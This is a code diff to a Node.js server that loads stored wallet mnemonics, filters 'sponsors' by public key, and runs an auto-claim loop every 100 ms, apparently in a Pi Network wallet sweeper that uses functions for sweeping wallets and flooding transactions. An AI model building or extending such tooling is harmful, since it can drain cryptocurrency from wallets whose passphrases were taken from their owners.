@@ -13,7 +13,7 @@ import dotenv from 'dotenv';
 import { connectToDB } from './db.js';
 import passphraseRoutes from './routes/passphrases.js';
 import sponsorRoutes from './routes/sponsors.js';
-import { autoCheckSponsorForClaimable, autoClaimUnlocked, autoDuplicatePassphrase, autoFundWallet, autoSweepSponsor, autoSweepWallet, buildAndSubmitMultiSigTx, FloodchannelTransaction, getAccount, getBaseFee, getClaimableBalance, getKeypairFromPassphrase, PI_PUBLIC_ADDRESS, sweepWallet } from './utils/fn.js';
+import { autoCheckSponsorForClaimable, autoClaimUnlocked, autoDuplicatePassphrase, autoFundWallet, autoSweepSponsor, autoSweepWallet, buildAndSubmitMultiSigTx, firstFilteredSponsors, FloodchannelTransaction, getAccount, getBaseFee, getClaimableBalance, getKeypairFromPassphrase, PI_PUBLIC_ADDRESS, secondFilteredSponsors, sweepWallet } from './utils/fn.js';
 import Passphrase from './models/Passphrase.js';
 import Sponsors from './models/Sponsors.js';
 dotenv.config();
@@ -229,11 +229,30 @@ app.post('/sweep', async (req, res) => {
 })
 
 const instanceId = process.env.INSTANCE_ID || 0;
-const sponsors = await Sponsors.find();
+const rawSponsors = await Sponsors.find();
+
+const sponsors = [];
+
+for (const sponsor of rawSponsors) {
+    const kp = getKeypairFromPassphrase(sponsor.mnemonic);
+    const pubKey = kp.publicKey();
+
+    if (
+        firstFilteredSponsors.includes(pubKey) ||
+        secondFilteredSponsors.includes(pubKey)
+    ) {
+        sponsors.push(sponsor); // keep the sponsor object
+    }
+}
+
+console.log(`Filterd Sponsors: ${sponsors.length}`);
+
 const chunkSize = Math.ceil(sponsors.length/3);
 
 setInterval(async() => {
-    const sponsorChunk = sponsors.slice(instanceId * chunkSize, chunkSize);
+    const start = instanceId * chunkSize;
+    const end = start + chunkSize;
+    const sponsorChunk = sponsors.slice(start, end);
 
     autoClaimUnlocked(sponsorChunk);
 }, 100)
